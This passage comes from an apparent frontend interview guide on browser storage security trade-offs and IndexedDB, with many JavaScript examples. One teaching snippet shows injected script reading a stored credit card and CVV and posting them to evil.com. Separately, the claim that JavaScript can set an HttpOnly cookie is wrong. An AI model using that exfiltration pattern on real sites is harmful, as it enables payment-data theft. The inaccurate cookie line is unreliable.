// - Fraudulent transactions: $0 ✅
// - Account takeovers: 0 ✅
// - Customer support tickets: 45/week (95% reduction)
// - Churn rate: 3% (normal)
// - Customer trust: Restored
// - Security audit: Passed with A rating
// - Insurance premium: Reduced 40%
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: Storage Best Practices</strong></summary>

### 1. Storage Method Trade-offs

| Method | Security | Size | Performance | Use Case |
|--------|----------|------|-------------|----------|
| **HttpOnly Cookie** | ✅✅✅ Excellent | ❌ 4KB | ✅ Good | Auth tokens |
| **localStorage** | ❌ Poor (XSS) | ✅ 10MB | ✅ Fast | UI state, prefs |
| **sessionStorage** | ❌ Poor (XSS) | ✅ 10MB | ✅ Fast | Temp data |
| **IndexedDB** | ❌ Poor (XSS) | ✅✅✅ GBs | ✅ Fast (async) | Large data |
| **Memory (variable)** | ✅✅ Good | ✅✅✅ RAM limit | ✅✅✅ Fastest | Session state |
| **Server-side session** | ✅✅✅ Excellent | ✅✅✅ Unlimited | ❌ Slow (network) | Sensitive data |

### 2. Compression vs No Compression

```javascript
// Trade-off: Compression saves space but costs CPU time

// Without compression:
const data = { large: 'x'.repeat(100000) };
localStorage.setItem('data', JSON.stringify(data)); // 100KB

// With compression:
const compressed = await compressData(data); // 10KB (90% smaller!)
localStorage.setItem('data-compressed', compressed);

// Trade-offs:
// - Storage: 90% space saved ✅
// - Write time: 50ms → 150ms (slower) ❌
// - Read time: 10ms → 80ms (slower) ❌
// - CPU usage: 2% → 15% (higher) ❌

// When to use:
// ✅ Large text-heavy data (>50KB)
// ✅ Infrequent access
// ❌ Real-time updates
// ❌ Small data (<10KB overhead)
```

### 3. Encryption vs Plain Text

```javascript
// Trade-off: Security vs Performance

// Plain text (insecure but fast):
localStorage.setItem('token', 'abc123'); // 1ms

// Encrypted (secure but slower):
await encryptAndStore('token', 'abc123'); // 50-100ms

// Trade-offs:
// - Security: ✅ Protected from XSS reading
// - Performance: ❌ 50-100x slower
// - Complexity: ❌ More code
// - Battery: ❌ More CPU (mobile impact)

// When to use encryption:
// ⚠️ ONLY if you absolutely cannot use HttpOnly cookies
// ✅ Temporary sensitive data
// ❌ Auth tokens (use HttpOnly cookies instead)
```

### 4. Synchronous vs Asynchronous Storage

```javascript
// localStorage (synchronous):
localStorage.setItem('key', value); // Blocks main thread
console.log('Next line'); // Waits for storage to complete

// IndexedDB (asynchronous):
await db.put('key', value); // Doesn't block
console.log('Next line'); // Executes immediately

// Trade-offs:
// localStorage:
// ✅ Simple API
// ✅ Works everywhere
// ❌ Blocks UI (bad for large data)
// ❌ 10MB limit

// IndexedDB:
// ✅ Doesn't block UI
// ✅ GB of storage
// ✅ Transactions, indexes
// ❌ Complex API
// ❌ Harder to debug

// Decision:
// Use localStorage for: <1MB, simple key-value
// Use IndexedDB for: >1MB, complex data, offline apps
```

### 5. Debouncing vs Immediate Writes

```javascript
// Immediate write (many disk operations):
input.addEventListener('input', (e) => {
  localStorage.setItem('draft', e.target.value); // Every keystroke!
});
// - Writes: 500/minute
// - Disk I/O: High
// - Battery: Drains faster
// - Performance: UI lag on slow devices

// Debounced write (batched operations):
input.addEventListener('input', debounce((e) => {
  localStorage.setItem('draft', e.target.value);
}, 500)); // Wait 500ms after last keystroke
// - Writes: 2-3/minute
// - Disk I/O: Low
// - Battery: Better
// - Performance: Smooth

// Trade-offs:
// Immediate: ✅ Never lose data ❌ Performance hit
// Debounced: ✅ Better performance ⚠️ May lose last 500ms

// Best practice: Debounce + beforeunload flush
```

### 6. Expiration Strategies

```javascript
// Strategy 1: TTL (Time-To-Live)
storage.set('data', value, { ttl: 3600000 }); // 1 hour
// ✅ Automatic cleanup
// ✅ Prevents stale data
// ❌ Overhead (store timestamp)

// Strategy 2: LRU (Least Recently Used)
// ✅ Keeps frequently used data
// ✅ Auto-evicts old data
// ❌ More complex
// ❌ Extra metadata

// Strategy 3: Manual cleanup
// ❌ Easy to forget
// ❌ Data piles up
// ✅ Full control

// Best practice: Combine TTL + periodic cleanup
```

### 7. Namespacing vs Flat Keys

```javascript
// Flat keys (simple but risky):
localStorage.setItem('user', '...');
localStorage.setItem('theme', '...');
// ⚠️ Name conflicts with other scripts
// ⚠️ Hard to clear app-specific data

// Namespaced keys (safer):
localStorage.setItem('myapp:user', '...');
localStorage.setItem('myapp:theme', '...');
// ✅ No conflicts
// ✅ Easy to clear all app data
// ⚠️ Longer keys (minimal overhead)

// Best practice: Always namespace
```

### Decision Matrix

| Scenario | Best Practice | Reason |
|----------|--------------|--------|
| **Auth tokens** | HttpOnly cookies | XSS protection |
| **User preferences** | localStorage + namespace | Persist across sessions |
| **Form autosave** | sessionStorage + debounce | Temp data, performance |
| **Large catalog** | IndexedDB | >10MB limit |
| **Real-time draft** | Debounced localStorage | Balance save frequency |
| **Sensitive data** | Server-side or encrypted | Security |
| **Offline app** | IndexedDB + Service Worker | Large data, sync |
| **Cross-tab sync** | localStorage + storage event | Built-in mechanism |

</details>

<details>
<summary><strong>💬 Explain to Junior: Storage Security Simplified</strong></summary>

**Simple Analogy: Storage as Filing Cabinets**

```javascript
// localStorage = Unlocked filing cabinet in public office
// - Anyone walking by can open it and read papers
// - If someone malicious gets in (XSS attack), they can steal everything
// - NOT safe for passwords, credit cards, social security numbers

localStorage.setItem('password', 'secret123'); // ❌ Anyone can read this!

// HttpOnly Cookie = Locked safe that only mail room (server) can open
// - JavaScript can't access it (even malicious scripts)
// - Only server sees the contents
// - SAFE for authentication tokens

// Set by server, can't be read by JavaScript:
document.cookie = "token=secret; HttpOnly"; // ✅ Safe from XSS
```

**Real-World Example:**

```javascript
// Scenario: E-commerce website

// ❌ DANGEROUS: Storing credit card in localStorage
localStorage.setItem('creditCard', '4111-1111-1111-1111');
localStorage.setItem('cvv', '123');

// Attacker injects malicious script (XSS):
<script>
  // Steals credit card!
  const card = localStorage.getItem('creditCard');
  const cvv = localStorage.getItem('cvv');

  // Sends to attacker
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ card, cvv })
  });
</script>

// Result: Credit card stolen, fraud charges! 💸

// ✅ SAFE: Never store credit card in browser
// Instead: Send directly to payment processor (Stripe, PayPal)
// They handle it securely on their servers
```

**Common Beginner Mistakes:**

```javascript
// ❌ MISTAKE 1: Storing sensitive data
localStorage.setItem('password', 'myPassword123');
localStorage.setItem('socialSecurity', '123-45-6789');
localStorage.setItem('creditCard', '4111-1111-1111-1111');

// Why it's bad:
// 1. Visible in browser DevTools (anyone with access can see)
// 2. Vulnerable to XSS (malicious scripts can steal)
// 3. Stored on disk in plain text
// 4. No expiration (stays forever until cleared)

// ✅ FIX: Never store these! Use server-side sessions instead


// ❌ MISTAKE 2: Not checking if storage is available
localStorage.setItem('theme', 'dark'); // Crashes in Safari private mode!

// ✅ FIX: Always check first
function saveTheme(theme) {
  try {
    localStorage.setItem('theme', theme);
  } catch (e) {
    console.warn('localStorage not available, using fallback');
    // Use cookies or remember in memory
  }
}


// ❌ MISTAKE 3: Storing huge data without handling errors
const hugeData = new Array(1000000).fill('data');
localStorage.setItem('cache', JSON.stringify(hugeData)); // CRASH!

// ✅ FIX: Handle quota errors
try {
  localStorage.setItem('cache', JSON.stringify(hugeData));
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('Storage full! Cleaning old data...');
    cleanupOldData();
  }
}
```

**Safe Storage Checklist:**

```javascript
// ✅ SAFE to store:
localStorage.setItem('theme', 'dark'); // UI preferences
localStorage.setItem('language', 'en'); // User settings
localStorage.setItem('fontSize', '16px'); // Display settings
localStorage.setItem('lastVisit', '2025-01-13'); // Non-sensitive timestamps

// ❌ NEVER store:
localStorage.setItem('password', '...'); // ❌ Passwords
localStorage.setItem('creditCard', '...'); // ❌ Payment info
localStorage.setItem('ssn', '...'); // ❌ Personal IDs
localStorage.setItem('privateKey', '...'); // ❌ Crypto keys
localStorage.setItem('apiSecret', '...'); // ❌ API secrets

// ⚠️ BE CAREFUL with:
localStorage.setItem('authToken', '...'); // ⚠️ Better in HttpOnly cookie
localStorage.setItem('email', '...'); // ⚠️ Depends on sensitivity
localStorage.setItem('cart', '...'); // ✅ OK if non-sensitive items
```

**Simple Helper (Production-Ready):**

```javascript
// Helper that handles all the tricky stuff:
const Storage = {
  // Safe set with error handling
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (e) {
      console.error('Storage error:', e.message);
      return false;
    }
  },

  // Safe get with fallback
  get(key, fallback = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : fallback;
    } catch (e) {
      console.error('Storage error:', e.message);
      return fallback;
    }
  },

  // Remove item
  remove(key) {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      console.error('Storage error:', e.message);
    }
  },

  // Clear all
  clear() {
    try {
      localStorage.clear();
    } catch (e) {
      console.error('Storage error:', e.message);
    }
  }
};

// Usage - simple and safe!
Storage.set('user', { name: 'Alice', age: 25 });
const user = Storage.get('user', { name: 'Guest' });
Storage.remove('user');
```

**Explaining to PM:**

"localStorage is like a public bulletin board:

**Problem:**
- Anyone can read it (including hackers)
- If someone hacks the website (XSS attack), they can steal everything on it
- Like posting your credit card number on a public board - terrible idea!

**Solution:**
- Only post non-sensitive information (theme preference, language, etc.)
- For passwords and payment info: Use secure server storage (like a bank vault)

**Business impact:**
- Wrong: Storing credit cards → Data breach → $500k fine + lawsuits
- Right: Storing preferences → Better UX → Happy customers

**Example:**
- Amazon: Stores your theme (dark/light) in localStorage ✅
- Amazon: Stores payment info on THEIR servers (not your browser) ✅
- This is why Amazon is secure!"

</details>

### Follow-up Questions

- "How do you detect if localStorage is disabled or full?"
- "What's the difference between localStorage quota and total storage quota?"
- "How would you implement a cache eviction policy?"
- "When should you use IndexedDB instead of localStorage?"
- "How do you protect against XSS when using localStorage?"

### Resources

- [MDN: Storage Quotas](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Browser_storage_limits_and_eviction_criteria)
- [Web.dev: Storage for the Web](https://web.dev/storage-for-the-web/)
- [OWASP: HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)

---

## Question 3: What is IndexedDB and when should you use it?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐
**Time:** 7-10 minutes
**Companies:** Google, Meta, Amazon

### Question
Explain IndexedDB. How does it differ from localStorage, and what are its use cases for storing large amounts of data?

### Answer

**IndexedDB** is a low-level API for client-side storage of significant amounts of structured data, including files and blobs. It's asynchronous and transactional.

1. **Key Characteristics**
   - **Asynchronous**: Doesn't block main thread
   - **Large capacity**: Gigabytes of storage (60% of disk space)
   - **Transactional**: ACID compliance (atomicity, consistency, isolation, durability)
   - **Indexed**: Fast queries using indexes
   - **Any data type**: Objects, files, blobs, not just strings
   - **Same-origin**: Isolated by origin

2. **vs localStorage**
   - **Capacity**: GB vs 10MB
   - **API**: Asynchronous vs synchronous
   - **Data types**: Any vs strings only
   - **Queries**: Indexed searches vs key-only
   - **Performance**: Better for large data
   - **Complexity**: More complex API

3. **Use Cases**
   - Offline-first applications
   - Caching large datasets (product catalogs)
   - Storing files and blobs
   - Progressive Web Apps (PWAs)
   - Complex queries needed
   - Client-side database

4. **Core Concepts**
   - **Database**: Container for object stores
   - **Object Store**: Like a table in SQL
   - **Index**: Fast lookup by non-key fields
   - **Transaction**: Atomic operations
   - **Cursor**: Iterate through results

5. **Limitations**
   - Complex API (compared to localStorage)
   - No SQL queries (uses indexes)
   - Browser support varies
   - Debugging is harder

### Code Example

```javascript
// 1. BASIC INDEXEDDB SETUP

// Open database (or create if doesn't exist)
function openDatabase() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('MyDatabase', 1);

    request.onerror = () => reject(request.error);
    request.onsuccess = () => resolve(request.result);

    // Called when database is created or version changes
    request.onupgradeneeded = (event) => {
      const db = event.target.result;

      // Create object store (like a table)
      if (!db.objectStoreNames.contains('products')) {
        const store = db.createObjectStore('products', {
          keyPath: 'id', // Primary key
          autoIncrement: true
        });

        // Create indexes for fast lookups
        store.createIndex('name', 'name', { unique: false });
        store.createIndex('category', 'category', { unique: false });
        store.createIndex('price', 'price', { unique: false });
      }
    };
  });
}

// Usage
const db = await openDatabase();
console.log('Database opened:', db.name);

// 2. CRUD OPERATIONS

class ProductDatabase {
  static db = null;
  static STORE_NAME = 'products';

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open('ProductDB', 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        if (!db.objectStoreNames.contains(this.STORE_NAME)) {
          const store = db.createObjectStore(this.STORE_NAME, {
            keyPath: 'id',
            autoIncrement: true
          });

          store.createIndex('name', 'name', { unique: false });
          store.createIndex('category', 'category', { unique: false });
        }
      };
    });
  }

  // CREATE: Add product
  static async addProduct(product) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.add(product);

      request.onsuccess = () => resolve(request.result); // Returns generated ID
      request.onerror = () => reject(request.error);
    });
  }

  // READ: Get product by ID
  static async getProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.get(id);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // READ: Get all products
  static async getAllProducts() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // UPDATE: Update product
  static async updateProduct(product) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.put(product); // put = update or insert

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // DELETE: Delete product
  static async deleteProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.delete(id);

      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  // SEARCH: Get products by category (using index)
  static async getProductsByCategory(category) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('category');
      const request = index.getAll(category);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }
}

// Usage:
await ProductDatabase.init();

// Add products
const id1 = await ProductDatabase.addProduct({
  name: 'Laptop',
  price: 999,
  category: 'Electronics'
});

const id2 = await ProductDatabase.addProduct({
  name: 'Mouse',
  price: 29,
  category: 'Electronics'
});

// Get product
const product = await ProductDatabase.getProduct(id1);
console.log(product); // { id: 1, name: "Laptop", price: 999, category: "Electronics" }

// Get all products
const allProducts = await ProductDatabase.getAllProducts();
console.log(allProducts); // [{ ... }, { ... }]

// Update product
await ProductDatabase.updateProduct({
  id: id1,
  name: 'Gaming Laptop',
  price: 1299,
  category: 'Electronics'
});

// Search by category
const electronics = await ProductDatabase.getProductsByCategory('Electronics');
console.log(electronics); // [{ ... }, { ... }]

// Delete product
await ProductDatabase.deleteProduct(id2);

// 3. USING CURSORS FOR ITERATION

async function iterateProducts() {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readonly');
    const store = transaction.objectStore('products');
    const request = store.openCursor();

    const results = [];

    request.onsuccess = (event) => {
      const cursor = event.target.result;

      if (cursor) {
        console.log('Product:', cursor.value);
        results.push(cursor.value);

        // Move to next item
        cursor.continue();
      } else {
        // No more items
        resolve(results);
      }
    };

    request.onerror = () => reject(request.error);
  });
}

// Usage:
const products = await iterateProducts();

// 4. RANGE QUERIES WITH INDEXES

async function getProductsInPriceRange(minPrice, maxPrice) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readonly');
    const store = transaction.objectStore('products');
    const index = store.index('price');

    // Create range
    const range = IDBKeyRange.bound(minPrice, maxPrice);
    const request = index.getAll(range);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// Usage: Get products between $50 and $500
const affordableProducts = await getProductsInPriceRange(50, 500);

// 5. TRANSACTIONS (ATOMIC OPERATIONS)

async function transferInventory(fromProduct, toProduct, quantity) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    // Start transaction (both reads and writes must succeed or all fail)
    const transaction = db.transaction(['products'], 'readwrite');
    const store = transaction.objectStore('products');

    // Get both products
    const getFrom = store.get(fromProduct);
    const getTo = store.get(toProduct);

    Promise.all([
      new Promise((res) => { getFrom.onsuccess = () => res(getFrom.result); }),
      new Promise((res) => { getTo.onsuccess = () => res(getTo.result); })
    ]).then(([from, to]) => {
      // Check inventory
      if (from.inventory < quantity) {
        transaction.abort(); // Rollback
        reject(new Error('Insufficient inventory'));
        return;
      }

      // Update inventory
      from.inventory -= quantity;
      to.inventory += quantity;

      // Save both (atomic - both succeed or both fail)
      store.put(from);
      store.put(to);

      transaction.oncomplete = () => resolve();
      transaction.onerror = () => reject(transaction.error);
    });
  });
}

// Usage: Move 10 units from product 1 to product 2
try {
  await transferInventory(1, 2, 10);
  console.log('Transfer successful');
} catch (e) {
  console.error('Transfer failed:', e);
}

// 6. STORING FILES AND BLOBS

async function saveImage(id, imageBlob) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readwrite');
    const store = transaction.objectStore('products');

    // Get existing product
    const getRequest = store.get(id);

    getRequest.onsuccess = () => {
      const product = getRequest.result;

      // Add image blob
      product.image = imageBlob;

      // Save
      const putRequest = store.put(product);
      putRequest.onsuccess = () => resolve();
      putRequest.onerror = () => reject(putRequest.error);
    };

    getRequest.onerror = () => reject(getRequest.error);
  });
}

// Usage:
const response = await fetch('/images/laptop.jpg');
const imageBlob = await response.blob();
await saveImage(1, imageBlob);

// Retrieve and display
const product = await ProductDatabase.getProduct(1);
const imageUrl = URL.createObjectURL(product.image);
document.getElementById('img').src = imageUrl;

// 7. PRACTICAL: OFFLINE-FIRST TODO APP

class TodoDB {
  static DB_NAME = 'TodoApp';
  static STORE_NAME = 'todos';
  static db = null;

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.DB_NAME, 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        const store = db.createObjectStore(this.STORE_NAME, {
          keyPath: 'id',
          autoIncrement: true
        });

        store.createIndex('completed', 'completed', { unique: false });
        store.createIndex('createdAt', 'createdAt', { unique: false });
      };
    });
  }

  static async addTodo(text) {
    await this.init();

    const todo = {
      text,
      completed: false,
      createdAt: Date.now(),
      updatedAt: Date.now()
    };

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.add(todo);

      request.onsuccess = () => resolve({ id: request.result, ...todo });
      request.onerror = () => reject(request.error);
    });
  }

  static async toggleTodo(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const getRequest = store.get(id);

      getRequest.onsuccess = () => {
        const todo = getRequest.result;
        todo.completed = !todo.completed;
        todo.updatedAt = Date.now();

        const putRequest = store.put(todo);
        putRequest.onsuccess = () => resolve(todo);
        putRequest.onerror = () => reject(putRequest.error);
      };

      getRequest.onerror = () => reject(getRequest.error);
    });
  }

  static async getAllTodos() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  static async getCompletedTodos() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('completed');
      const request = index.getAll(true); // Get where completed = true

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  static async deleteTodo(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.delete(id);

      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }
}

// Usage:
await TodoDB.init();

// Add todos
await TodoDB.addTodo('Buy groceries');
await TodoDB.addTodo('Write code');
await TodoDB.addTodo('Exercise');

// Get all todos
const allTodos = await TodoDB.getAllTodos();
console.log('All todos:', allTodos);

// Toggle completion
await TodoDB.toggleTodo(1);

// Get completed todos
const completed = await TodoDB.getCompletedTodos();
console.log('Completed:', completed);

// Delete todo
await TodoDB.deleteTodo(2);

// 8. WRAPPER LIBRARY (SIMPLER API)

// Using idb library (https://github.com/jakearchibald/idb)
import { openDB } from 'idb';

async function useIDBLibrary() {
  // Much simpler API!
  const db = await openDB('MyDB', 1, {
    upgrade(db) {
      db.createObjectStore('products', { keyPath: 'id', autoIncrement: true });
    }
  });

  // Add
  await db.add('products', { name: 'Laptop', price: 999 });

  // Get
  const product = await db.get('products', 1);

  // Get all
  const all = await db.getAll('products');

  // Delete
  await db.delete('products', 1);

  // Clear all
  await db.clear('products');
}

// 9. MIGRATION PATTERN

class VersionedDB {
  static async open() {
    return openDB('MyApp', 3, {
      upgrade(db, oldVersion, newVersion, transaction) {
        // Version 1: Initial schema
        if (oldVersion < 1) {
          db.createObjectStore('users', { keyPath: 'id' });
        }

        // Version 2: Add posts store
        if (oldVersion < 2) {
          db.createObjectStore('posts', { keyPath: 'id' });
        }

        // Version 3: Add index to posts
        if (oldVersion < 3) {
          const store = transaction.objectStore('posts');
          store.createIndex('userId', 'userId');
        }
      }
    });
  }
}

// Database automatically migrates from any version to latest
```

### Common Mistakes

- ❌ **Mistake:** Not handling async properly
  ```javascript
  const db = indexedDB.open('DB', 1); // Returns request, not DB!
  db.transaction(...); // Error: db is not the database
  ```

- ❌ **Mistake:** Forgetting to create indexes during upgrade
  ```javascript
  request.onupgradeneeded = (event) => {
    const db = event.target.result;
    db.createObjectStore('products', { keyPath: 'id' });
    // Forgot to create indexes! Can't add them later without version bump
  };
  ```

- ✅ **Correct:** Use promises and plan indexes ahead
  ```javascript
  const db = await new Promise((resolve) => {
    const request = indexedDB.open('DB', 1);
    request.onsuccess = () => resolve(request.result);

    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('name', 'name'); // Plan indexes ahead
    };
  });
  ```

<details>
<summary><strong>🔍 Deep Dive: IndexedDB Internals</strong></summary>

**How IndexedDB Stores Data:**

```javascript
// IndexedDB uses SQLite database on disk:
// Chrome/Edge: %LOCALAPPDATA%\Google\Chrome\User Data\Default\IndexedDB\
// Firefox: %APPDATA%\Mozilla\Firefox\Profiles\[profile]\storage\default\
// Safari: ~/Library/Safari/Databases/

// Data format: Binary structured data
// - Keys: Sorted binary format
// - Values: Structured clone algorithm (preserves types)

// Example internal representation:
// Object: { id: 1, name: "Alice", data: new Uint8Array([1, 2, 3]) }
// Stored as: Binary blob with type information preserved
// Unlike localStorage which converts everything to strings!
```

**Transaction Isolation:**

```javascript
// IndexedDB uses snapshot isolation:

// Transaction 1 (read-only):
const tx1 = db.transaction(['products'], 'readonly');
const store1 = tx1.objectStore('products');
const product1 = await store1.get(1); // { price: 100 }

// Transaction 2 (concurrent, read-write):
const tx2 = db.transaction(['products'], 'readwrite');
const store2 = tx2.objectStore('products');
const product2 = await store2.get(1); // { price: 100 }
product2.price = 200;
await store2.put(product2);
await tx2.complete;

// Transaction 1 still sees old value (snapshot isolation):
console.log(product1.price); // 100 (not 200!)

// New transaction sees new value:
const tx3 = db.transaction(['products'], 'readonly');
const product3 = await tx3.objectStore('products').get(1);
console.log(product3.price); // 200 ✅
```

**Index Performance:**

```javascript
// Without index: O(n) - scans all records
async function findByNameSlow(name) {
  const all = await db.getAll('products');
  return all.filter(p => p.name === name); // Scans all!
}

// With index: O(log n) - uses B-tree
async function findByNameFast(name) {
  const index = store.index('name');
  return await index.getAll(name); // Fast lookup!
}

// Benchmark: 10,000 products
console.time('no-index');
await findByNameSlow('Laptop'); // ~50ms
console.timeEnd('no-index');

console.time('with-index');
await findByNameFast('Laptop'); // ~2ms (25x faster!)
console.timeEnd('with-index');

// Index storage overhead:
// - B-tree structure: ~10-20% of data size
// - Worth it for frequently queried fields
```

**Quota Management:**

```javascript
// IndexedDB quota (modern browsers):
// - Chrome/Edge: Up to 60% of available disk space
// - Firefox: Up to 50% of available disk space
// - Safari: Up to 1GB

// Check quota:
if (navigator.storage && navigator.storage.estimate) {
  const estimate = await navigator.storage.estimate();
  console.log('Used:', (estimate.usage / 1024 / 1024).toFixed(2), 'MB');
  console.log('Quota:', (estimate.quota / 1024 / 1024).toFixed(2), 'MB');
}

// Request persistent storage (prevents eviction):
const isPersisted = await navigator.storage.persist();
console.log('Persistent:', isPersisted);

// Browsers may evict IndexedDB under storage pressure:
// - Cache API evicted first
// - Then IndexedDB
// - localStorage rarely evicted
```

**Structured Clone Algorithm:**

```javascript
// IndexedDB uses structured clone (preserves types):

// Can store (unlike localStorage):
const data = {
  date: new Date(),
  regexp: /test/gi,
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  buffer: new Uint8Array([1, 2, 3]),
  blob: new Blob(['content']),
  file: new File(['content'], 'file.txt')
};

await db.put('store', data);
const retrieved = await db.get('store');

console.log(retrieved.date instanceof Date); // true ✅
console.log(retrieved.regexp.test('TEST')); // true ✅
console.log(retrieved.map.get('key')); // "value" ✅

// Cannot store:
// - Functions
// - DOM nodes
// - Error objects (partially)
// - WeakMap/WeakSet

// Attempt to store function:
await db.put('store', { fn: () => {} }); // Error: DataCloneError
```

**Performance Optimizations:**

```javascript
// 1. Batch operations in single transaction (much faster):

// ❌ Slow: 1000 separate transactions
for (let i = 0; i < 1000; i++) {
  await db.add('products', { name: `Product ${i}` }); // ~1000ms
}

// ✅ Fast: 1 transaction with 1000 operations
const tx = db.transaction('products', 'readwrite');
const store = tx.objectStore('products');
for (let i = 0; i < 1000; i++) {
  store.add({ name: `Product ${i}` }); // Don't await!
}
await tx.done; // ~50ms (20x faster!)

// 2. Use cursors for large datasets (memory efficient):

// ❌ Memory heavy: Load all 100k records
const all = await db.getAll('products'); // 100MB in memory!

// ✅ Memory efficient: Stream with cursor
let cursor = await db.transaction('products').objectStore('products').openCursor();
while (cursor) {
  console.log(cursor.value); // Process one at a time
  cursor = await cursor.continue();
}

// 3. Index compound keys for complex queries:
db.createObjectStore('orders').createIndex(
  'userDate',
  ['userId', 'date'], // Compound index
  { unique: false }
);

// Fast query:
const range = IDBKeyRange.bound(
  ['user123', new Date('2025-01-01')],
  ['user123', new Date('2025-12-31')]
);
const orders = await index.getAll(range); // Fast!
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: Offline Product Catalog</strong></summary>

**Scenario:** Your e-commerce PWA needs to work offline. Users should browse 50,000 products even without internet. localStorage can't handle this (10MB limit), so you implement IndexedDB.

**The Challenge:**

```javascript
// Problem: 50,000 products = ~25MB JSON
// - localStorage: 10MB limit (won't fit!)
// - Fetching on every visit: Slow (3-5 seconds)
// - Need: Fast offline browsing

// Initial failed approach:
async function loadProductsCatalogBad() {
  const response = await fetch('/api/products'); // 25MB download
  const products = await response.json(); // 50,000 products

  // Try to cache in localStorage
  try {
    localStorage.setItem('products', JSON.stringify(products));
    // Error: QuotaExceededError ❌
  } catch (e) {
    console.error('Cannot store in localStorage:', e);
  }
}

// User experience:
// - First visit: 5 second wait downloading products
// - Refresh: Another 5 second wait (no cache!)
// - Offline: App breaks completely
// - Customer complaints: "App is too slow"
```

**Solution: IndexedDB with Smart Caching:**

```javascript
// ✅ Production-ready solution
class ProductCatalog {
  static DB_NAME = 'ProductCatalog';
  static STORE_NAME = 'products';
  static CACHE_VERSION = 1;
  static db = null;

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.DB_NAME, this.CACHE_VERSION);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        // Create products store
        const store = db.createObjectStore(this.STORE_NAME, {
          keyPath: 'id'
        });

        // Create indexes for fast searches
        store.createIndex('category', 'category', { unique: false });
        store.createIndex('name', 'name', { unique: false });
        store.createIndex('price', 'price', { unique: false });
        store.createIndex('brand', 'brand', { unique: false });

        // Compound index for category + price range queries
        store.createIndex('categoryPrice', ['category', 'price'], { unique: false });
      };
    });
  }

  // Sync products from server (runs in background)
  static async syncProducts() {
    await this.init();

    try {
      console.log('Syncing products from server...');
      const response = await fetch('/api/products');
      const products = await response.json(); // 50,000 products

      // Batch insert in single transaction (fast!)
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);

      // Clear old data
